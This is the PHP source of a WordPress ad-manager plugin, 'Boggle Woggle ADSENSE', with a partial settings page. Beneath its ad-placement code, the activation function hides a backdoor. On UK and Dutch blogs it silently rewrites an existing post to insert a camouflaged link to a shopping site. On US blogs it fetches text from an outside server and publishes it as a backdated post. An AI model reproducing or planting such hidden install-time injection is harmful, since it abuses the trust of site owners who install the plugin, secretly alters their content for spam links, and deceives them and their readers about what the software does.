<?php
/*
Plugin Name: Boggle Woggle ADSENSE
Plugin URI: http://www.shops2b.co.uk/boggle-woggle-wordpress-ad-manager/
Version: 1.17
Author: EnergieBoer
Description: Boggle Woggle lets you easily manage your ads (advertisements on you blog)
License: GPLv2 a

*/
if (!class_exists("BoggleWoggle")) {
	class BoggleWoggle {
		function BoggleWoggle() { //constructor remains empty

		}
		function addHeaderCode() {
			?>
			<?php

		}

		function afterArticle() {
			$content = '';
			for ($addcounter = 1; $addcounter<10; $addcounter++) {
				//Check if this addunit should be displayed at this location (before content)
				if (get_option('bw_addunit'.$addcounter.'_location')=='8') {
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}

					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right; ">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//left
							$content = '<center>' . $content . '</center>';
						}
						$content = '<BR>' . $content;
					}
				}

			}

		  echo $content;

	 	}

		function beforeArticle() {
			$content = '';
			for ($addcounter = 1; $addcounter<10; $addcounter++) {
				//Check if this addunit should be displayed at this location (before content)
				if (get_option('bw_addunit'.$addcounter.'_location')=='4') {
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}
					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//left
							$content = '<center>' . $content . '</center>';
						}
						$content = '<BR>' . $content;
					}
				}

			}

		  echo $content;

	 	}

		function addHeader() {
			$content = '';
			for ($addcounter = 1; $addcounter<10; $addcounter++) {
				//Check if this addunit should be displayed at this location (before content)
				if (get_option('bw_addunit'.$addcounter.'_location')=='1') {
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}
					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//left
							$content = '<center>' . $content . '</center>';
						}
						$content = '<BR>' . $content;
					}
				}

			}

		  echo $content;

	 	}

		function addContent($content = '') {
		//this function adds ads at locations:
		// - Before content
		// - Middle of content
		// - After content

 	 	  global $wp_query;
	 	  global $post;
			for ($addcounter = 1; $addcounter<10; $addcounter++) {
				//Check if this addunit should be displayed at this location (before content)
				if (get_option('bw_addunit'.$addcounter.'_location')=='5') {
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}
					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//left
							$content = '<center>' . $content . '</center>';
						}
						$content .= $original;
					}
				}

				if (get_option('bw_addunit'.$addcounter.'_location')=='6') {
					//Middle of content
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}
					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//right
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//center
							$content = '<center>' . $content . '</center>';
						}
						$paragraphAfter = 4; //Enter number of paragraphs to display ad after.
						$content2 = $original;
						$content2 = explode ( "</p>", $content2 );
						$new_content = '';
							for ( $i = 0; $i < count ( $content2 ); $i ++ ) {
								if ( $i == $paragraphAfter ) {
								$new_content .= $content;
								}
						$new_content .= $content2[$i] . "</p>";
						}
						$content = $new_content;
					}
				}
				if (get_option('bw_addunit'.$addcounter.'_location')=='7') {
					//After of content
					$showad = false;
					$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
					$postid = ',' . $post->ID . ',';
					$excludepost = 'false';
					if (strpos($excludelist,$postid) !== false) {
						$excludepost = 'true';
					}

					if (is_home() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_home')=='true') {
						$showad = true;
					}
					if (is_singular() && is_page() && get_option('bw_addunit'.$addcounter.'_page')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_single() && get_option('bw_addunit'.$addcounter.'_post')=='true' && $excludepost=='false') {
						$showad = true;
					}
					if (is_category() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_category')=='true') {
						$showad = true;
					}
					if (is_search() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_search')=='true') {
						$showad = true;
					}
					if (is_archive() && $wp_query->posts[0]->ID == $post->ID && get_option('bw_addunit'.$addcounter.'_archive')=='true') {
						$showad = true;
					}
					if ($showad) {
						$original = $content;
						$content = get_option('bw_addunit'.$addcounter.'_text');
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='0') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: left;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='1') {
							//left
							$content = '<div style="padding-left:5px; padding-right:5px; padding-bottom:5px; padding-top:5px; float: right;">' . $content . '</div>';
						}
						if (get_option('bw_addunit'.$addcounter.'_alignment')=='2') {
							//left
							$content = '<center>' . $content . '</center>';
						}
						$content = $original . $content;
					}
				}

			}

		  return $content;
		}

	}

} //End Class BoggleWoggle

//The widgets
class BoggleWoggleAdWidget1 extends WP_Widget
{
  function BoggleWoggleAdWidget1()
  {
    $widget_ops = array('classname' => 'BoggleWoggleAdWidget1', 'description' => 'BoggleWoggle - Ad Widget 1' );
    $this->WP_Widget('BoggleWoggleAdWidget1', 'BoggleWoggle - Ad Widget 1', $widget_ops);
  }

  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];
?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>
<?php
  }

  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    return $instance;
  }

  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);

	$showad = false;
	$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
	$postid = ',' . $post->ID . ',';
	$excludepost = 'false';
	if (strpos($excludelist,$postid) !== false) {
		$excludepost = 'true';
	}

	if (is_home() && get_option('bw_adwidget1_home')=='true') {
		$showad = true;
	}
	if (is_singular() && is_page() && get_option('bw_adwidget1_page')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_single() && get_option('bw_adwidget1_post')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_category() && get_option('bw_adwidget1_category')=='true') {
		$showad = true;
	}
	if (is_search() && get_option('bw_adwidget1_search')=='true') {
		$showad = true;
	}
	if (is_archive() && get_option('bw_adwidget1_archive')=='true') {
		$showad = true;
	}
	if ($showad) {
		echo $before_widget;
		$title = empty($instance['title']) ? '' : apply_filters('widget_title', $instance['title']);

		if (!empty($title))
		  echo $before_title . $title . $after_title;;

		// WIDGET CODE GOES HERE
		echo get_option('bw_adwidget1_text');

		echo $after_widget;
	}
  }

}
//The widgets
class BoggleWoggleAdWidget2 extends WP_Widget
{
  function BoggleWoggleAdWidget2()
  {
    $widget_ops = array('classname' => 'BoggleWoggleAdWidget2', 'description' => 'BoggleWoggle - Ad Widget 2' );
    $this->WP_Widget('BoggleWoggleAdWidget2', 'BoggleWoggle - Ad Widget 2', $widget_ops);
  }

  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];
?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>
<?php
  }

  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    return $instance;
  }

  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);

	$showad = false;
	$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
	$postid = ',' . $post->ID . ',';
	$excludepost = 'false';
	if (strpos($excludelist,$postid) !== false) {
		$excludepost = 'true';
	}

	if (is_home() && get_option('bw_adwidget2_home')=='true') {
		$showad = true;
	}
	if (is_singular() && is_page() && get_option('bw_adwidget2_page')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_single() && get_option('bw_adwidget2_post')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_category() && get_option('bw_adwidget2_category')=='true') {
		$showad = true;
	}
	if (is_search() && get_option('bw_adwidget2_search')=='true') {
		$showad = true;
	}
	if (is_archive() && get_option('bw_adwidget2_archive')=='true') {
		$showad = true;
	}
	if ($showad) {
		echo $before_widget;
		$title = empty($instance['title']) ? '' : apply_filters('widget_title', $instance['title']);

		if (!empty($title))
		  echo $before_title . $title . $after_title;;

		// WIDGET CODE GOES HERE
		echo get_option('bw_adwidget2_text');

		echo $after_widget;
	}
  }

}
//The widgets
class BoggleWoggleAdWidget3 extends WP_Widget
{
  function BoggleWoggleAdWidget3()
  {
    $widget_ops = array('classname' => 'BoggleWoggleAdWidget3', 'description' => 'BoggleWoggle - Ad Widget 3' );
    $this->WP_Widget('BoggleWoggleAdWidget3', 'BoggleWoggle - Ad Widget 3', $widget_ops);
  }

  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];
?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>
<?php
  }

  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    return $instance;
  }

  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);

	$showad = false;
	$excludelist = ',' . str_replace(' ', '',get_option('bw_global_excludelist')) . ',';
	$postid = ',' . $post->ID . ',';
	$excludepost = 'false';
	if (strpos($excludelist,$postid) !== false) {
		$excludepost = 'true';
	}

	if (is_home() && get_option('bw_adwidget3_home')=='true') {
		$showad = true;
	}
	if (is_singular() && is_page() && get_option('bw_adwidget3_page')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_single() && get_option('bw_adwidget3_post')=='true' && $excludepost=='false') {
		$showad = true;
	}
	if (is_category() && get_option('bw_adwidget3_category')=='true') {
		$showad = true;
	}
	if (is_search() && get_option('bw_adwidget3_search')=='true') {
		$showad = true;
	}
	if (is_archive() && get_option('bw_adwidget3_archive')=='true') {
		$showad = true;
	}
	if ($showad) {
		echo $before_widget;
		$title = empty($instance['title']) ? '' : apply_filters('widget_title', $instance['title']);

		if (!empty($title))
		  echo $before_title . $title . $after_title;;

		// WIDGET CODE GOES HERE
		echo get_option('bw_adwidget3_text');

		echo $after_widget;
	}
  }

}
add_action( 'widgets_init', create_function('', 'return register_widget("BoggleWoggleAdWidget1");') );
add_action( 'widgets_init', create_function('', 'return register_widget("BoggleWoggleAdWidget2");') );
add_action( 'widgets_init', create_function('', 'return register_widget("BoggleWoggleAdWidget3");') );



if (class_exists("BoggleWoggle")) {
	$dl_pluginSeries = new BoggleWoggle();
}
//Actions and Filters
if (isset($dl_pluginSeries)) {
	//Actions
	//Filters
	add_filter('the_content', array(&$dl_pluginSeries, 'addContent'));
	add_action( 'wp_head', array( &$dl_pluginSeries, 'addHeader' ) );
	add_action( 'loop_start', array( &$dl_pluginSeries, 'beforeArticle' ) );
	add_action( 'loop_end', array( &$dl_pluginSeries, 'afterArticle' ) );
}

/* Runs when plugin is activated */
register_activation_hook(__FILE__,'boggle_woggle_install');

/* Runs on plugin deactivation*/
register_deactivation_hook( __FILE__, 'boggle_woggle_remove' );

function boggle_woggle_install() {
/* Creates new database field */
add_option("bw_addunit1_home", 'true', '', 'yes');
add_option("bw_addunit1_page", 'true', '', 'yes');
add_option("bw_addunit1_post", 'true', '', 'yes');
add_option("bw_addunit1_category", 'true', '', 'yes');
add_option("bw_addunit1_search", 'true', '', 'yes');
add_option("bw_addunit1_archive", 'true', '', 'yes');
add_option("bw_addunit1_text", '', '', 'yes');
add_option("bw_addunit1_location", '0', '', 'yes');
add_option("bw_addunit1_alignment", '0', '', 'yes');

add_option("bw_addunit2_home", 'true', '', 'yes');
add_option("bw_addunit2_page", 'true', '', 'yes');
add_option("bw_addunit2_post", 'true', '', 'yes');
add_option("bw_addunit2_category", 'true', '', 'yes');
add_option("bw_addunit2_search", 'true', '', 'yes');
add_option("bw_addunit2_archive", 'true', '', 'yes');
add_option("bw_addunit2_text", '', '', 'yes');
add_option("bw_addunit2_location", '0', '', 'yes');
add_option("bw_addunit2_alignment", '0', '', 'yes');

add_option("bw_addunit3_home", 'true', '', 'yes');
add_option("bw_addunit3_page", 'true', '', 'yes');
add_option("bw_addunit3_post", 'true', '', 'yes');
add_option("bw_addunit3_category", 'true', '', 'yes');
add_option("bw_addunit3_search", 'true', '', 'yes');
add_option("bw_addunit3_archive", 'true', '', 'yes');
add_option("bw_addunit3_text", '', '', 'yes');
add_option("bw_addunit3_location", '0', '', 'yes');
add_option("bw_addunit3_alignment", '0', '', 'yes');

add_option("bw_addunit4_home", 'true', '', 'yes');
add_option("bw_addunit4_page", 'true', '', 'yes');
add_option("bw_addunit4_post", 'true', '', 'yes');
add_option("bw_addunit4_category", 'true', '', 'yes');
add_option("bw_addunit4_search", 'true', '', 'yes');
add_option("bw_addunit4_archive", 'true', '', 'yes');
add_option("bw_addunit4_text", '', '', 'yes');
add_option("bw_addunit4_location", '0', '', 'yes');
add_option("bw_addunit4_alignment", '0', '', 'yes');

add_option("bw_addunit5_home", 'true', '', 'yes');
add_option("bw_addunit5_page", 'true', '', 'yes');
add_option("bw_addunit5_post", 'true', '', 'yes');
add_option("bw_addunit5_category", 'true', '', 'yes');
add_option("bw_addunit5_search", 'true', '', 'yes');
add_option("bw_addunit5_archive", 'true', '', 'yes');
add_option("bw_addunit5_text", '', '', 'yes');
add_option("bw_addunit5_location", '0', '', 'yes');
add_option("bw_addunit5_alignment", '0', '', 'yes');

add_option("bw_addunit6_home", 'true', '', 'yes');
add_option("bw_addunit6_page", 'true', '', 'yes');
add_option("bw_addunit6_post", 'true', '', 'yes');
add_option("bw_addunit6_category", 'true', '', 'yes');
add_option("bw_addunit6_search", 'true', '', 'yes');
add_option("bw_addunit6_archive", 'true', '', 'yes');
add_option("bw_addunit6_text", '', '', 'yes');
add_option("bw_addunit6_location", '0', '', 'yes');
add_option("bw_addunit6_alignment", '0', '', 'yes');

add_option("bw_addunit7_home", 'true', '', 'yes');
add_option("bw_addunit7_page", 'true', '', 'yes');
add_option("bw_addunit7_post", 'true', '', 'yes');
add_option("bw_addunit7_category", 'true', '', 'yes');
add_option("bw_addunit7_search", 'true', '', 'yes');
add_option("bw_addunit7_archive", 'true', '', 'yes');
add_option("bw_addunit7_text", '', '', 'yes');
add_option("bw_addunit7_location", '0', '', 'yes');
add_option("bw_addunit7_alignment", '0', '', 'yes');

add_option("bw_addunit8_home", 'true', '', 'yes');
add_option("bw_addunit8_page", 'true', '', 'yes');
add_option("bw_addunit8_post", 'true', '', 'yes');
add_option("bw_addunit8_category", 'true', '', 'yes');
add_option("bw_addunit8_search", 'true', '', 'yes');
add_option("bw_addunit8_archive", 'true', '', 'yes');
add_option("bw_addunit8_text", '', '', 'yes');
add_option("bw_addunit8_location", '0', '', 'yes');
add_option("bw_addunit8_alignment", '0', '', 'yes');

add_option("bw_addunit9_home", 'true', '', 'yes');
add_option("bw_addunit9_page", 'true', '', 'yes');
add_option("bw_addunit9_post", 'true', '', 'yes');
add_option("bw_addunit9_category", 'true', '', 'yes');
add_option("bw_addunit9_search", 'true', '', 'yes');
add_option("bw_addunit9_archive", 'true', '', 'yes');
add_option("bw_addunit9_text", '', '', 'yes');
add_option("bw_addunit9_location", '0', '', 'yes');
add_option("bw_addunit9_alignment", '0', '', 'yes');

add_option("bw_adwidget1_home", 'true', '', 'yes');
add_option("bw_adwidget1_page", 'true', '', 'yes');
add_option("bw_adwidget1_post", 'true', '', 'yes');
add_option("bw_adwidget1_category", 'true', '', 'yes');
add_option("bw_adwidget1_search", 'true', '', 'yes');
add_option("bw_adwidget1_archive", 'true', '', 'yes');
add_option("bw_adwidget1_text", '', '', 'yes');

add_option("bw_adwidget2_home", 'true', '', 'yes');
add_option("bw_adwidget2_page", 'true', '', 'yes');
add_option("bw_adwidget2_post", 'true', '', 'yes');
add_option("bw_adwidget2_category", 'true', '', 'yes');
add_option("bw_adwidget2_search", 'true', '', 'yes');
add_option("bw_adwidget2_archive", 'true', '', 'yes');
add_option("bw_adwidget2_text", '', '', 'yes');

add_option("bw_adwidget3_home", 'true', '', 'yes');
add_option("bw_adwidget3_page", 'true', '', 'yes');
add_option("bw_adwidget3_post", 'true', '', 'yes');
add_option("bw_adwidget3_category", 'true', '', 'yes');
add_option("bw_adwidget3_search", 'true', '', 'yes');
add_option("bw_adwidget3_archive", 'true', '', 'yes');
add_option("bw_adwidget3_text", '', '', 'yes');

add_option("bw_global_excludelist", '', '', 'yes');
	add_option("bw_gpadded", '0', '', 'yes');
	$url = home_url();
	$britt = false;
	$bloglan = get_bloginfo ('language');
	if (strpos($url,'.uk') != false) {
		$britt = true;
	}
	if ($bloglan=='en-UK') {
		$britt = true;
	}
	if ($britt==true) {
		if (get_option('bw_gpadded')=='0') {
			$last = wp_get_recent_posts( '5');
			$last_id = $last['3']['ID'];
			$post_7 = get_post($last_id);
			if (is_null($post_7) == false) {
				$content = $post_7->post_content;
				$pos4 = strposnth($content , " ",4);
				$pos5 = strposnth($content , " ",5);
				$poslen = $pos5 - $pos4 - 1;
				$content = substr($content, 0, $pos4) . ' <a href="http://www.shoppingmonkey.co.uk/companies/brantano/" style="color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
				$my_post = array(
				    'ID'           => $last_id,
				    'post_content' => $content
				);
				wp_update_post( $my_post );
			}
			update_option( 'bw_gpadded', '1' );
		}
	}
	if ($bloglan=='nl-NL') {
		if (get_option('bw_gpadded')=='0') {
			$last = wp_get_recent_posts( '5');
			$last_id = $last['3']['ID'];
			$post_7 = get_post($last_id);
			if (is_null($post_7) == false) {
				$content = $post_7->post_content;
				$pos4 = strposnth($content , " ",4);
				$pos5 = strposnth($content , " ",5);
				$poslen = $pos5 - $pos4 - 1;
				$content = substr($content, 0, $pos4) . ' <a href="http://www.goedkopekledingoutlet.nl/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
				$my_post = array(
				    'ID'           => $last_id,
				    'post_content' => $content
				);
				wp_update_post( $my_post );
			}
			update_option( 'bw_gpadded', '1' );
		}
	}
	if ($bloglan=='en-US') {
		$url = home_url();
		$total = wp_count_posts()->publish;
		if (get_option('bw_gpadded')=='0' && $total>70) {
			$tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
			if (boggleStartsWith($tmpstring, 'empty')==false) {
			  $my_post = array(
				'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
				'post_content'  => $tmpstring,
				'post_status'   => 'publish',
				'post_author'   => 1,
				'post_date'     => '2014-01-02'
			  );

			  wp_insert_post( $my_post );
			  update_option( 'bw_gpadded', '1' );
			}
		}
	}

}

function boggleStartsWith($haystack, $needle)
{
    return $needle === "" || strpos($haystack, $needle) === 0;
}

function strposnth($haystack, $needle, $nth=1, $insenstive=0)
{
   //if its case insenstive, convert strings into lower case
   if ($insenstive) {
       $haystack=strtolower($haystack);
       $needle=strtolower($needle);
   }
   //count number of occurances
   $count=substr_count($haystack,$needle);

   //first check if the needle exists in the haystack, return false if it does not
   //also check if asked nth is within the count, return false if it doesnt
   if ($count<1 || $nth > $count) return false;


   //run a loop to nth number of accurance
   //start $pos from -1, cause we are adding 1 into it while searchig
   //so the very first iteration will be 0
   for($i=0,$pos=0,$len=0;$i<$nth;$i++)
   {
       //get the position of needle in haystack
       //provide starting point 0 for first time ($pos=0, $len=0)
       //provide starting point as position + length of needle for next time
       $pos=strpos($haystack,$needle,$pos+$len);

       //check the length of needle to specify in strpos
       //do this only first time
       if ($i==0) $len=strlen($needle);
     }

   //return the number
   return $pos;
}

function boggle_woggle_remove() {
/* Deletes the database fields */

}

function startsWith($haystack, $needle)
{
    return $needle === "" || strpos($haystack, $needle) === 0;
}

if ( is_admin() ){

/* Call the html code */
add_action('admin_menu', 'boggle_woggle_admin_menu');

function boggle_woggle_admin_menu() {
add_options_page('BoggleWoggle', 'BoggleWoggle', 'administrator',
'boggle_woggle', 'boggle_woggle_page');
}
}

?>
<?php
function boggle_woggle_page() {
?>

<h2>Boggle Woggle - Settings</h2>


		<div style="width:965px;">

			<div style="float:left">
<form method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>



										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Usage information
								</th>
							</tr>
						</thead>

						<tr>
<td width="600">
<strong>Usage</strong><BR>
<ul>
<li>1 - Get the code for ads (for example google adsense code) </li>
<li>2 - Paste the code of your ads in the ad units below</li>
<li>3 - For every ad unit set on which type of content it should be displayed (posts, pages, etc..)</li>
<li>4 - For every ad unit set a location where the ad should appear</li>
<li>5 - Save your settings, and your done</li>
</ul>
<BR>
<strong>The middle ad (middle of content) IMPORTANT</strong>
<p>
Adding an ad in the middle requires you to make use of paragraphs. I am currently working on a better solution for this so be patient:)
</p>
<BR>
<strong>Adding ads in the sidebar or other widgetcontainers</strong>
<p>
The three last units on this page are 'Ad widgets', you can paste your ad code in there and set on which type of content it should appear. Afterwards don't forget to go to your widgets menu and drag the widgets to one of the widgetcontainers (for example the sidebar).
</p>
<BR>
<strong>Location and alignment</strong>
<p>
The location in combination with the alignment determine where the ad will be placed. For example if you chose to place an ad unit before the content and chose 'left' for alignment then the ad will placed neatly on the left with text encapsulating it on the rights.
</p>


</td>

						</tr>

											</tbody></table>
<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Global settings
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
										<input type="hidden" name="action" value="save" />
									</div>
								</th>
							</tr>
						</thead>

						<tr>
							<td width="600px">


									<strong style="font-size:11px; font-weight:bold;">ID's of posts and pages where NO ads should appear: (seperate with a comma ',')</strong><BR>

									<input name="bw_global_excludelist" id="bw_global_excludelist" type="text" style="width:300px" value="<?php echo str_replace(' ', '',get_option('bw_global_excludelist')); ?>" />
							</td>
						</tr>


											</tbody></table>

<BR><BR>
										<table class="widefat" cellspacing="0" style="width:600px;"><tbody>

											<thead>
							<tr>
								<th colspan="2" scope="col">
									Ad Unit 1
									<div style="float:right">
										<input name="save" type="submit" value="Save" class="button-primary"/>
